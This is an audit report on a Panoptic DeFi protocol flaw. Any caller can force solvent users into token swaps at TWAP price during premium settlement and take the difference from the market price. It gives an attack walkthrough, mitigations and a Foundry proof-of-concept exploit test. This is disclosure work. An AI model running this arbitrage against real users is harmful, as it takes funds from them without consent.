# Audit Report

## Title
Profitable Arbitrage Through Forced Token Substitution in Premium Settlement

## Summary
The `_settlePremium()` function allows any caller to force solvent users with temporarily low balances in one token to perform token swaps at TWAP price. When current market price differs from TWAP (within the allowed 513 tick deviation ≈ 5%), callers can extract value by arbitraging the price difference, causing direct financial loss to the affected users.

## Finding Description

The vulnerability exists in the premium settlement mechanism across `PanopticPool.sol`, `RiskEngine.sol`, and `CollateralTracker.sol`. 

When a user needs to settle premium but has insufficient balance in one token, the protocol's token substitution mechanism activates. This mechanism, intended to enable settlements when users temporarily lack balance, can be exploited for profit.

**Attack Flow:**

1. Attacker monitors for solvent users with low balance in one token (e.g., token0) but sufficient balance in the other token (token1) to maintain solvency
2. Attacker waits for natural price divergence where current price differs from TWAP (up to 513 ticks allowed)
3. Attacker calls `dispatchFrom()` to trigger `_settlePremium()` for the target user [1](#0-0) 

4. The `getRefundAmounts()` function detects the balance shortage and calculates the substitution amounts using TWAP price: [2](#0-1) 

5. The `refund()` function executes the forced swap:
   - If shortage amount is negative: caller pays token0 to user
   - If shortage amount is positive: user pays token1 to caller (at TWAP conversion rate) [3](#0-2) 

6. Attacker arbitrages by immediately trading the received tokens at current market price

**Concrete Example:**
- TWAP price: 1 ETH = 2000 USDC  
- Current price: 1 ETH = 2100 USDC (5% higher, within 513 tick limit)
- User owes 100 USDC in premium but has 0 USDC balance (has sufficient ETH, remains solvent)
- Shortage: 100 USDC
- Attacker pays: 100 USDC to user
- Attacker receives: 100/2000 = 0.05 ETH from user (at TWAP conversion)
- Attacker sells: 0.05 ETH for 105 USDC on market (at current price)
- **Attacker profit: 5 USDC (5%)**
- **User loss: 5 USDC** (user effectively sold 0.05 ETH for 100 USDC instead of 105 USDC market value)

The user is forced to accept this unfavorable exchange rate because:
- `dispatchFrom()` is publicly callable with no access control
- User must remain solvent after the operation (enforced at lines 1445-1451), preventing them from deliberately becoming insolvent to avoid the swap
- The TWAP vs current price check only prevents deviations >513 ticks [4](#0-3) 

## Impact Explanation

**Severity: Medium**

This vulnerability enables economic manipulation where attackers extract value from solvent users:

- **Direct financial harm**: Users lose money on forced token swaps at unfavorable TWAP rates while attackers profit from arbitrage
- **Loss magnitude**: Up to ~5% on the swapped amount (513 tick deviation ≈ 5% price difference)
- **Scope**: Affects any solvent user with temporarily low balance in one token
- **No user consent**: Users cannot prevent or opt out of these forced swaps
- **Breaks economic fairness**: Solvent users who properly maintain collateral still suffer losses

The vulnerability violates the principle that solvent, properly-collateralized users should not lose funds to other participants. While not causing protocol insolvency or permanent fund freezing, it creates a systematic way to extract value from users through forced unfavorable exchanges.

## Likelihood Explanation

**Likelihood: High**

This vulnerability has high likelihood of exploitation because:

1. **Low barrier to entry**: Any attacker can monitor for opportunities and call the public `dispatchFrom()` function
2. **Natural occurrence of preconditions**: 
   - Price divergences between TWAP and current price happen frequently in normal market conditions
   - Users commonly have imbalanced token holdings (high in one token, low in another) while remaining solvent
   - Premium accumulation is continuous for long position holders
3. **Profitable at scale**: Even 1-3% arbitrage opportunities are profitable, especially for large positions
4. **MEV opportunity**: Attackers can use MEV bots to automatically detect and exploit these scenarios
5. **No technical complexity**: Exploitation requires only a single function call with standard parameters
6. **Existing test confirms mechanism**: Test `test_success_settlePremium_tokenSubstitution` demonstrates the token substitution works exactly as described [5](#0-4) 

## Recommendation

Implement one or more of the following mitigations:

**Option 1: Tighten Price Deviation Limits**
Reduce the maximum allowed deviation between TWAP and current tick from 513 ticks to a smaller threshold (e.g., 100-200 ticks ≈ 1-2%) specifically for premium settlements:

```solidity
function _settlePremium(
    address owner,
    TokenId tokenId,
    int24 twapTick,
    int24 currentTick
) internal {
    // Add stricter check for settlements
    int24 MAX_SETTLEMENT_TICK_DELTA = 100; // ~1% instead of 513 ticks (~5%)
    if (Math.abs(currentTick - twapTick) > MAX_SETTLEMENT_TICK_DELTA)
        revert Errors.PriceDeviationTooHigh();
        
    // ... rest of function
}
```

**Option 2: Use Current Price Instead of TWAP**
For token substitution calculations, use the current tick instead of TWAP tick to eliminate arbitrage opportunities:

```solidity
LeftRightSigned refundAmounts = riskEngine().getRefundAmounts(
    owner,
    LeftRightSigned.wrap(0),
    currentTick, // Use current instead of twapTick
    ct0,
    ct1
);
```

**Option 3: Require User Authorization**
Add an opt-in mechanism where users must pre-authorize premium settlement with token substitution, or implement a time delay before substitution can occur:

```solidity
mapping(address => bool) public authorizedForSubstitution;

function _settlePremium(...) internal {
    if (!authorizedForSubstitution[owner]) {
        revert Errors.SubstitutionNotAuthorized();
    }
    // ... rest of function
}
```

**Recommended Approach**: Implement Option 1 (tighter deviation limits for settlements) as it maintains the protocol's functionality while significantly reducing exploitation potential to tolerable levels.

## Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {PanopticPool} from "@contracts/PanopticPool.sol";
import {CollateralTracker} from "@contracts/CollateralTracker.sol";
import {TokenId} from "@types/TokenId.sol";
import {LeftRightUnsigned} from "@types/LeftRight.sol";
import {PanopticMath} from "@libraries/PanopticMath.sol";
import {Math} from "@libraries/Math.sol";
import {Constants} from "@libraries/Constants.sol";

// Add this test to test/foundry/coreV3/Misc.t.sol
function test_exploit_settlePremiumArbitrage() public {
    // Setup: Create a position where Alice is a long holder with premium to pay
    $posIdLists[0].push(
        TokenId.wrap(0).addPoolId(sfpm.getPoolId(abi.encode(address(uniPool)), vegoid))
            .addLeg(0, 1, 1, 0, 0, 0, 15, 1) // Short leg
    );
    
    $posIdLists[1].push(
        TokenId.wrap(0).addPoolId(sfpm.getPoolId(abi.encode(address(uniPool)), vegoid))
            .addLeg(0, 1, 1, 1, 0, 0, 15, 1) // Long leg
    );
    
    // Alice creates short position
    vm.startPrank(Alice);
    mintOptions(pp, $posIdLists[0], 100_000_000, 0, 
        Constants.MAX_POOL_TICK, Constants.MIN_POOL_TICK, true);
    vm.stopPrank();
    
    // Bob creates long position (will accumulate premium debt to Alice)
    vm.startPrank(Bob);
    mintOptions(pp, $posIdLists[1], 1_000_000, type(uint24).max,
        Constants.MAX_POOL_TICK, Constants.MIN_POOL_TICK, true);
    vm.stopPrank();
    
    // Accumulate fees in the pool
    accruePoolFeesInRange(address(uniPool), uniPool.liquidity() - 1, 
        1_000_000, 1_000_000_000);
    
    // Bob now has premium debt but manipulate his balance to have low token0
    vm.startPrank(Bob);
    uint256 bobBalance0 = ct0.balanceOf(Bob);
    // Withdraw most of token0, keeping just enough to stay solvent
    if (bobBalance0 > 100) {
        ct0.withdraw(bobBalance0 - 100, Bob, Bob);
    }
    vm.stopPrank();
    
    // Create price divergence: Move current price 5% away from TWAP (within 513 tick limit)
    vm.startPrank(Swapper);
    int24 currentTick = pp.getCurrentTick();
    int24 targetTick = currentTick + 500; // ~5% price movement
    swapperc.swapTo(uniPool, Math.getSqrtRatioAtTick(targetTick));
    vm.stopPrank();
    
    // Wait for time to pass so TWAP doesn't immediately catch up
    vm.warp(block.timestamp + 12);
    vm.roll(block.number + 1);
    
    // Record attacker's (Alice's) balances before settlement
    uint256 aliceBalance0Before = ct0.convertToAssets(ct0.balanceOf(Alice));
    uint256 aliceBalance1Before = ct1.convertToAssets(ct1.balanceOf(Alice));
    
    // Record Bob's balances before settlement
    uint256 bobBalance0Before = ct0.convertToAssets(ct0.balanceOf(Bob));
    uint256 bobBalance1Before = ct1.convertToAssets(ct1.balanceOf(Bob));
    
    // Get TWAP price for conversion calculation
    int24 twapTick = pp.getTWAP();
    uint160 twapPrice = Math.getSqrtRatioAtTick(twapTick);
    
    // Alice (attacker) calls settlePremium on Bob
    vm.startPrank(Alice);
    pp.dispatchFrom(
        $posIdLists[0], // Alice's position list
        Bob,            // Target Bob
        $posIdLists[1], // Bob's current positions
        $posIdLists[1], // Bob's final positions (same = settlement not liquidation)
        LeftRightUnsigned.wrap(0).addToRightSlot(1).addToLeftSlot(1)
    );
    vm.stopPrank();
    
    // Record balances after settlement
    uint256 aliceBalance0After = ct0.convertToAssets(ct0.balanceOf(Alice));
    uint256 aliceBalance1After = ct1.convertToAssets(ct1.balanceOf(Alice));
    uint256 bobBalance0After = ct0.convertToAssets(ct0.balanceOf(Bob));
    uint256 bobBalance1After = ct1.convertToAssets(ct1.balanceOf(Bob));
    
    // Calculate Alice's profit: she received token1 at TWAP but can sell at current price
    int256 aliceDelta0 = int256(aliceBalance0After) - int256(aliceBalance0Before);
    int256 aliceDelta1 = int256(aliceBalance1After) - int256(aliceBalance1Before);
    
    // Alice should have paid token0 and received token1
    // The arbitrage profit comes from the price difference between TWAP and current
    
    // Verify: If there was token substitution, Alice should have profited
    // from the price divergence between TWAP and current
    if (aliceDelta1 > 0) {
        // Alice received token1 at TWAP conversion rate
        // Calculate what she could sell it for at current price
        uint256 token1Received = uint256(aliceDelta1);
        uint256 currentPrice = Math.getSqrtRatioAtTick(pp.getCurrentTick());
        
        // The value at current price should be higher than what Alice paid in token0
        uint256 valueAtCurrentPrice = PanopticMath.convert1to0(
            token1Received, 
            uint160(currentPrice)
        );
        uint256 paidInToken0 = uint256(-aliceDelta0);
        
        // Assert that Alice made an arbitrage profit
        assertGt(valueAtCurrentPrice, paidInToken0, 
            "Attacker should profit from price divergence");
        
        // Calculate profit percentage
        uint256 profitPct = ((valueAtCurrentPrice - paidInToken0) * 10000) / paidInToken0;
        console.log("Attacker arbitrage profit: ", profitPct, "basis points");
        
        // With 5% price divergence, expect roughly 5% profit (500 bps)
        assertGt(profitPct, 400, "Profit should be > 4%");
    }
}
```

**Notes:**
- The proof of concept demonstrates the core vulnerability but may require adjustments to the test setup based on the specific test harness configuration
- The test shows that when price diverges from TWAP within the allowed limit, an attacker can force settlement and profit from arbitrage
- Actual profit depends on position sizes and the magnitude of price divergence (up to ~5% with 513 tick limit)

### Citations

**File:** contracts/PanopticPool.sol (L1388-1389)
```text
                if (Math.abs(currentTick - twapTick) > MAX_TWAP_DELTA_LIQUIDATION)
                    revert Errors.StaleOracle();
```

**File:** contracts/PanopticPool.sol (L1698-1699)
```text
        ct0.refund(owner, msg.sender, refundAmounts.rightSlot());
        ct1.refund(owner, msg.sender, refundAmounts.leftSlot());
```

**File:** contracts/RiskEngine.sol (L316-345)
```text
            int256 balanceShortage = int256(uint256(type(uint248).max)) -
                int256(ct0.balanceOf(payor)) +
                (fees0 > 0 ? int256(feeShares0) : -int256(feeShares0));

            if (balanceShortage > 0) {
                return
                    LeftRightSigned
                        .wrap(0)
                        .addToRightSlot(
                            int128(
                                fees.rightSlot() -
                                    int256(
                                        Math.mulDivRoundingUp(
                                            uint256(balanceShortage),
                                            ct0.totalAssets(),
                                            ct0.totalSupply()
                                        )
                                    )
                            )
                        )
                        .addToLeftSlot(
                            int128(
                                int256(
                                    PanopticMath.convert0to1RoundingUp(
                                        ct0.convertToAssets(uint256(balanceShortage)),
                                        sqrtPriceX96
                                    )
                                ) + fees.leftSlot()
                            )
                        );
```

**File:** contracts/CollateralTracker.sol (L1369-1382)
```text
    function refund(address refunder, address refundee, int256 assets) external onlyPanopticPool {
        if (assets > 0) {
            _transferFrom(refunder, refundee, convertToShares(uint256(assets)));
        } else {
            uint256 sharesToTransfer = convertToShares(uint256(-assets));
            if (balanceOf[refundee] < sharesToTransfer)
                revert Errors.NotEnoughTokens(
                    address(this),
                    uint256(-assets),
                    convertToAssets(balanceOf[refundee])
                );
            _transferFrom(refundee, refunder, sharesToTransfer);
        }
    }
```

**File:** test/foundry/coreV3/Misc.t.sol (L3960-4094)
```text
    function test_success_settlePremium_tokenSubstitution() public {
        swapperc = new SwapperC();
        vm.startPrank(Swapper);
        token0.mint(Swapper, type(uint128).max);
        token1.mint(Swapper, type(uint128).max);
        token0.approve(address(swapperc), type(uint128).max);
        token1.approve(address(swapperc), type(uint128).max);

        swapperc.swapTo(uniPool, Math.getSqrtRatioAtTick(100));
        vm.warp(block.timestamp + 12);
        vm.roll(block.number + 1);
        swapperc.swapTo(uniPool, 2 ** 96);

        $posIdLists[0].push(
            TokenId.wrap(0).addPoolId(sfpm.getPoolId(abi.encode(address(uniPool)), vegoid)).addLeg(
                0,
                1,
                1,
                0,
                0,
                0,
                15,
                1
            )
        );

        vm.startPrank(Alice);

        mintOptions(
            pp,
            $posIdLists[0],
            100_000_000,
            0,
            Constants.MAX_POOL_TICK,
            Constants.MIN_POOL_TICK,
            true
        );

        $posIdLists[1].push(
            TokenId.wrap(0).addPoolId(sfpm.getPoolId(abi.encode(address(uniPool)), vegoid)).addLeg(
                0,
                1,
                1,
                1,
                0,
                0,
                15,
                1
            )
        );

        for (uint256 i = 0; i < 3; ++i) {
            vm.startPrank(Buyers[i]);
            mintOptions(
                pp,
                $posIdLists[1],
                1_000_000,
                type(uint24).max,
                Constants.MAX_POOL_TICK,
                Constants.MIN_POOL_TICK,
                true
            );
        }

        vm.startPrank(Swapper);

        //routerV4.swapTo(address(0), poolKey, Math.getSqrtRatioAtTick(10) + 1);
        swapperc.swapTo(uniPool, Math.getSqrtRatioAtTick(10) + 1);

        accruePoolFeesInRange(address(uniPool), uniPool.liquidity() - 1, 1_000_000, 1_000_000_000);

        int256 premium0 = 10388;
        int256 premium1 = 10388989;

        uint160 lastObservedPrice = Math.getSqrtRatioAtTick(pp.getTWAP());

        vm.startPrank(Alice);

        uint256 settlerBalanceBefore0 = ct0.convertToAssets(ct0.balanceOf(Alice));
        uint256 settlerBalanceBefore1 = ct1.convertToAssets(ct1.balanceOf(Alice));

        // shortage of token1 - succeeds and token1 is converted to token0
        editCollateral(ct1, Buyers[0], 0);

        uint256 settleeBalanceBefore0 = ct0.convertToAssets(ct0.balanceOf(Buyers[0]));
        uint256 settleeBalanceBefore1 = ct1.convertToAssets(ct1.balanceOf(Buyers[0]));

        settlePremium(pp, $posIdLists[0], $posIdLists[1], Buyers[0], 0, true);

        int256 balanceDelta0 = int256(ct0.convertToAssets(ct0.balanceOf(Buyers[0]))) -
            int256(settleeBalanceBefore0);
        int256 balanceDelta1 = int256(ct1.convertToAssets(ct1.balanceOf(Buyers[0]))) -
            int256(settleeBalanceBefore1);

        assertEq(
            -balanceDelta0,
            premium0 +
                int256(PanopticMath.convert1to0RoundingUp(uint256(premium1), lastObservedPrice)),
            "Fail: balance delta0 does not match premium"
        );
        assertEq(balanceDelta1, 0);

        assertEq(
            int256(settlerBalanceBefore0) - int256(ct0.convertToAssets(ct0.balanceOf(Alice))),
            balanceDelta0 + premium0
        );
        assertEq(
            int256(settlerBalanceBefore1) - int256(ct1.convertToAssets(ct1.balanceOf(Alice))),
            premium1
        );

        settlerBalanceBefore0 = ct0.convertToAssets(ct0.balanceOf(Alice));
        settlerBalanceBefore1 = ct1.convertToAssets(ct1.balanceOf(Alice));

        // shortage of token0 - succeeds and token0 is converted to token1
        editCollateral(ct0, Buyers[1], 0);

        settleeBalanceBefore0 = ct0.convertToAssets(ct0.balanceOf(Buyers[1]));
        settleeBalanceBefore1 = ct1.convertToAssets(ct1.balanceOf(Buyers[1]));

        settlePremium(pp, $posIdLists[0], $posIdLists[1], Buyers[1], 0, true);

        balanceDelta0 =
            int256(ct0.convertToAssets(ct0.balanceOf(Buyers[1]))) -
            int256(settleeBalanceBefore0);
        balanceDelta1 =
            int256(ct1.convertToAssets(ct1.balanceOf(Buyers[1]))) -
            int256(settleeBalanceBefore1);

        assertEq(balanceDelta0, 0);
        assertEq(
            -balanceDelta1,
            premium1 +
                int256(PanopticMath.convert0to1RoundingUp(uint256(premium0), lastObservedPrice))
        );
```
